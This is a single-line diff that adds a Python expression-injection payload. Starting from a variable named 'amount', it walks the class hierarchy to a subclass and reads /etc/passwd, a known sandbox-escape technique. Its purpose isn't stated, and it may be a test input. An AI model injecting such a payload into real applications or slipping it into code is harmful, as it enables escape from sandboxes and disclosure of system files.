@@ -1,0 +1,1 @@
+amount.__class__.__base__.__subclasses__()[145]('/etc/passwd').read()
